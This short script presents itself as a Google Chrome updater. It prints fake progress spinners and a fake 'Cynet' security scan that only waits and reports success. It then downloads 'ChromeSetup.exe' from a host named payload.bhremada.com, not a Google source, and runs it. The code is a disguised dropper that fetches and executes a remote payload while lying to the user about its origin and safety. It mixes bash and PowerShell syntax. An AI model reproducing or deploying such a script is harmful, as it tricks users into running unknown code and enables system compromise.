Clear-Host

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

info()    { echo -e "${BLUE}[~]${RESET} $1"; }
success() { echo -e "${GREEN}[✔]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
error()   { echo -e "${RED}[✘]${RESET} $1"; }
task()    { echo -e "${CYAN}[*]${RESET} ${BOLD}$1${RESET}"; }

spinner() {
  local message="$1"
  local duration="${2:-5}"
  local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local end=$((SECONDS + duration))

  while [ $SECONDS -lt $end ]; do
    for frame in "${frames[@]}"; do
      printf "\r  ${CYAN}${frame}${RESET} ${message}"
      sleep 0.1
    done
  done
  printf "\r\033[K" 
}

task "Updating Google Chrome..."
info    "Fetching latest version from official sources..."
spinner    "Downloading package..." 2
success "Package downloaded"

echo ""

spinner "Cynet - Scanning downloaded files..." 2
success "Cynet - Scan complete."

echo ""

info    "Installing package..."

wget https://payload.bhremada.com/ChromeSetup.exe -OutFile ChromeSetup.exe
.\ChromeSetup.exe
